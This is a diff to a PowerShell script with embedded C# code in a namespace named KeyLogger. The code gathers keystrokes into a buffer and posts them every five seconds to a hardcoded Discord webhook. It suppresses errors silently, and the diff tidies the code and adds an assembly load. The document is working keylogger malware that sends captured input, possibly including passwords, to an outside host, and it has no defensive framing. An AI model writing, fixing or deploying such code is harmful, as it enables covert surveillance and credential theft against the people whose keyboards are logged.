@@ -1,4 +1,6 @@
+# Load required assemblies explicitly so namespaces like System.Windows.Forms and System.Net.Http are available
 Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Net.Http
 
 Add-Type -TypeDefinition @"
 using System;
@@ -19,12 +21,10 @@ namespace KeyLogger {
         private static StringBuilder buffer = new StringBuilder();
         private static readonly object bufferLock = new object();
 
-        // Properly embed your Discord webhook URL as a literal string here:
         private static string discordWebhookUrl = "https://discordapp.com/api/webhooks/1408110244558799019/nU-r_w_V3FtUCzX7cv08lV4MhVojEPR0cQ5XsP7dI-HuEDNRvr3gZOOwcRyZnjcmilgO";
 
         [STAThread]
         public static void Main() {
-            // Setup timer to send collected keys periodically (every 5 seconds)
             System.Timers.Timer sendTimer = new System.Timers.Timer(5000);
             sendTimer.Elapsed += (s, e) => SendBufferAsync().Wait();
             sendTimer.AutoReset = true;
@@ -56,7 +56,7 @@ namespace KeyLogger {
         }
 
         private static async Task SendBufferAsync() {
-            string dataToSend = null;
+            string dataToSend;
             lock(bufferLock) {
                 if (buffer.Length == 0) return;
                 dataToSend = buffer.ToString();
@@ -70,11 +70,10 @@ namespace KeyLogger {
                     await client.PostAsync(discordWebhookUrl, content);
                 }
             } catch {
-                // ignore exceptions silently
+                // Silent failure to avoid disruption
             }
         }
 
-        // Escape special characters for JSON string
         private static string EscapeForJson(string s) {
             return s.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", "");
         }
